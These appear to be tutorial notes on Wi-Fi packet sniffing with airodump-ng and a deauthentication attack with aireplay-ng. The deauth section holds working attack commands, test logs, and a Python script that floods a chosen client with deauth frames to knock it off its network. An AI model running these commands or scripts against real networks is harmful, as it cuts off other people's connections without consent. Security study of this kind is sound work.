## Packet Sniffing Basics

- Packet sniffing is the process of capturing and analyzing network packets to gather information about the network traffic.
- This is used to analyze and view detailed information about the network around us.
- Now that we have monitor mode enabled on our wireless interface, we are able to capture all the wifi packets sent within our range. 
- We can capture them even if the packet is not directed to our device, if we are not connected to the target network, or without knowing the key/password of the target network.
- Now all we need is a program that can capture and analyze these packets.

>[!IMPORTANT]
>The program we are using is `airodump-ng`, which is a part of the Aircrack-ng suite. It is a packet sniffer; a program designed to capture packets while in monitor mode. Iit allows us to see all the wireless networks around us, and show us detailed information about its MAC Address, its channel, its encryption, the clients connected to the network, and more.

- To run the program use the command:

    ```bash
    root@kali:~# airodump-ng wlan0
    ```

- You will see output of the following nature:

- Now, let's analyze the output to understand what it's actually showing:

  - **ESSID**: The name of the wireless network.
  - **BSSID**: The MAC address of the target network.
  - **PWR**: The signal strength of the network.
  - **Beacons**: The number of beacon frames sent by the network in order to announce its presence.
  - **#Data**: The number of data packets captured from the network.
  - **#/s**: The number of data packets captured per second.
  - **CH**: The channel on which the network broadcasts and receives on.
  - **MB**: The maximum speed of the network.
  - **ENC**: The encryption type used by the network (e.g. WPA2, WPA3).
  - **CIPHER**: The cipher used for encryption.
  - **AUTH**: The authentication method used by the network (e.g. PSK)

## Wifi Bands

- The band of the network defines what frequency it can use to broadcast the signal. This means it also defines the frequency that the clients or the computers need to be able to support and use in order to be able to connect to this network.
- The main bands used in WiFi networks are `2.4GHz` and `5GHz`.
- When we initially executed the `airodump-ng` command, we saw the networks listed but they were all 2.4GHz networks. Although the wireless adapter we are using supports both the 2.4GHz and 5GHz bands, its default channel is set to 2.4GHz.
- To see the networks on the 5GHz band, we can use the `--band` option with `airodump-ng`:
- So, the modified command would be:

    ```bash
    root@kali:~# airodump-ng --band abg wlan0
    ```

    `a` stands for 5GHz and `b` stands for 2.4GHz.
    `abg` means we want to see both 2.4GHz and 5GHz networks.

   The output will show the networks on the 5GHz band networks as well.

    Quitting...

    ```

- We see many more networks than before because we can see the networks on the 5GHz band as well.
- Keep in mind that in order to sniff data on the 5GHz frequency, your wireless adapter must support the 5GHz band. If it doesn't, you won't be able to see the networks on that band.

## Targeted Packet Sniffing

- In order to capture packets from a specific network, we can use the `--bssid` option with `airodump-ng` command.
- The `--bssid` option allows us to specify the MAC address of the target network we want to capture packets from.
- We modify our command to be:

    ```bash
    root@kali:~# airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <FILENAME> wlan0
    ```

- This command will capture packets from the specified `bssid` or `MAC Address` of the target network, on the specified `channel`, and save the captured packets to a file with the given `filename` using `wlan0` as the wireless interface.

- When we run a command like this, we get the following output:

    ```bash
    root@kali:~# airodump-ng --bssid 8C:DC:02:8A:72:D0 --channel 12 --write test wlan0
    20:28:55  Created capture file "test-02.cap".

    ```

- We have some new files in our current working directory, which contain the data that we captured. If we do `ls -a`, we will see the following files:

    ```bash
    root@kali:~# ls -a
    .                 .face             .python_history  Public                 test-01.log.csv
    ..                .face.icon        .ssh             PycharmProjects        test-02.cap
    .BurpSuite        .gvfs             .viminfo         Templates              test-02.csv
    .bash_history     .java             .zenmap          Videos                 test-02.kismet.csv
    .bash_logout      .local            .zshrc           bettercap.history      test-02.kismet.netxml
    .bashrc           .maltego          Desktop          go                     test-02.log.csv
    .bashrc.original  .mariadb_history  Documents        test-01.cap
    .cache            .mozilla          Downloads        test-01.csv
    .config           .profile          Music            test-01.kismet.csv
    .dbus             .profile.bak      Pictures         test-01.kismet.netxml
    ```

- We have a `csv` file, a `cap` file, a `kismet.netxml` file, and a `kismet.csv` file. The main file that we will be using here is the `cap` file.
- The `cap` file contains the data that we captured from the target network during the period. It should contain everything that was sent to/from the target network during that time. It should contain URLs, chat messages, usernames, passwords or anything that any of these devices did on the internet, because anything that they have to do will have to be sent to the router.
- The only problem is that our target network is encrypted with `WPA2`, which means that the data is encrypted and we cannot read it directly.
- But we can analyze the packets using a tool called `Wireshark`, which is a network protocol analyzer that can read and analyze the packets in the `cap` file.

## Deauthentication Attack

- The Deauthentication attack allows us to disconnect a client from a wireless network by sending deauthentication frames to the target client.
- For this we will be pretending to be the client that we want to disconnect by changing our MAC Address to the MAC Address of the client, and tell the router that we want to disconnect from it. Then we are going to pretend to be the router, by changing our MAC Address to the MAC Address of the router, and tell the client that we want to disconnect it.
- This will successfully allow us to disconnect or deauthenticate any client from any network.

- For this we will be using the `aireplay-ng` command, which is a part of the `aircrack-ng` suite. It allows us to send deauthentication frames to the target client.

- In order to do so, use the command:

    ```bash
    root@kali:~# aireplay-ng --deauth 100000000 -a <BSSID> -c <CLIENT_MAC> -D wlan0
    ```

  - Remove `-D` if the target network is 2.4GHz Network.

- I tested this on my mobile, and my mobile got disconnected from the network. It tried to reconnect to the network, but it failed to do so. It kept trying to reconnect for a while, but it failed to do so.

- Below are the logs:

    ```bash
    root@kali:~# aireplay-ng --deauth 100000000 -a WIFI_MAC -c MOBILE_MAC -D wlan0
    21:12:19  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [53|68 ACKs]

    21:12:21  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|64 ACKs]
    ```

- To confirm this we also run the `airodump-ng` command again to see how the packets are being lost, along with screenshots of the mobile trying to reconnect to the network:

    ```bash
    root@kali:~# airodump-ng --bssid WIFI_MAC --channel 36 wlan0

- Let's write down a Python script to automate this process of deauthentication attack. The script will take the wireless interface name, target client MAC address, and gateway (AP) MAC address as input and perform the deauthentication attack.

    ```python
    # Deauthentication Attack Script
    # This script performs a deauthentication attack on a specified Wi-Fi network.

    import os
    import subprocess
    def deauth_attack(interface, target_mac, gateway_mac):
        print(f"[+] Starting deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
        
        # Construct the command for the deauthentication attack
        command = [
            "sudo", "aireplay-ng", "--deauth", "100000000", "-a", gateway_mac, "-c", target_mac, interface
        ]
        
        # Execute the command
        subprocess.call(command)
        
        
    # Example usage
    if __name__ == "__main__":
        # Fetch the interface name using iwconfig command
        interface = input("Enter the interface name (e.g., wlan0): ")
        target_mac = input("Enter the target MAC address (victim): ")
        gateway_mac = input("Enter the gateway (AP) MAC address: ")
        print(f"[+] Initiating Deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
        deauth_attack(interface, target_mac, gateway_mac)
        print("[+] Deauthentication attack completed")
        
    ```
